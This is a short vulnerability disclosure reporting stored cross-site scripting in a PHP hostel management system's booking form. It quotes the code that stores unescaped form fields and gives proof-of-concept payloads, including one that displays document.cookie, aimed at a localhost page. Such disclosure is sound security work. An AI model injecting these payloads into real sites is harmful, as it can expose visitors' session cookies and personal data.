# Hostel Management System #

## supplier ##

https://code-projects.org/hostel-management-site-using-php-source-code/

## Vulnerability file ##

book-hostel.php  room-details.php

## describe ##

The `book-hostel.php` file contains an unrestricted cross-site scripting (XSS) vulnerability, where all parameters can be passed into the `room-details.php` database, leading to a stored XSS attack. Malicious attackers can exploit this vulnerability to obtain sensitive information from the client side.

### Code analysis ###

Line 7-40 in book-hostel.php

```php
if(isset($_POST['submit']))
{
$roomno=$_POST['room'];
$seater=$_POST['seater'];
$feespm=$_POST['fpm'];
$foodstatus=$_POST['foodstatus'];
$stayfrom=$_POST['stayf'];
$duration=$_POST['duration'];
$course=$_POST['course'];
$regno=$_POST['regno'];
$fname=$_POST['fname'];
$mname=$_POST['mname'];
$lname=$_POST['lname'];
$gender=$_POST['gender'];
$contactno=$_POST['contact'];
$emailid=$_POST['email'];
$emcntno=$_POST['econtact'];
$gurname=$_POST['gname'];
$gurrelation=$_POST['grelation'];
$gurcntno=$_POST['gcontact'];
$caddress=$_POST['address'];
$ccity=$_POST['city'];
$cstate=$_POST['state'];
$cpincode=$_POST['pincode'];
$paddress=$_POST['paddress'];
$pcity=$_POST['pcity'];
$pstate=$_POST['pstate'];
$ppincode=$_POST['ppincode'];
$query="insert into  registration(roomno,seater,feespm,foodstatus,stayfrom,duration,course,regno,firstName,middleName,lastName,gender,contactno,emailid,egycontactno,guardianName,guardianRelation,guardianContactno,corresAddress,corresCIty,corresState,corresPincode,pmntAddress,pmntCity,pmnatetState,pmntPincode) values(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)";
$stmt = $mysqli->prepare($query);
$rc=$stmt->bind_param('iiiisisissssisississsisssi',$roomno,$seater,$feespm,$foodstatus,$stayfrom,$duration,$course,$regno,$fname,$mname,$lname,$gender,$contactno,$emailid,$emcntno,$gurname,$gurrelation,$gurcntno,$caddress,$ccity,$cstate,$cpincode,$paddress,$pcity,$pstate,$ppincode);
$stmt->execute();
echo"<script>alert('Student Succssfully register');</script>";
}
```

## POC ##
For pcity parameter, the test payload is `<script>alert(1)</script>`
For paddress parameter, the test payload is `<script>alert(document.cookie)</script>`
Visit this URL to trigger the cross-site scripting vulnerability.

```
http://localhost:8083/hostel/hostel/room-details.php
```

### Rusult ###
For parameter "pcity":
![image-2024-12-17](https://github.com/asd1238525/cve/blob/main/images/C86D5F5793428B917B254DDF3EB13AFC.png)
For parameter "paddress":
![image-2024-12-17-1](https://github.com/asd1238525/cve/blob/main/images/ECBA309DC86B06E635506466F5BA324D.png)
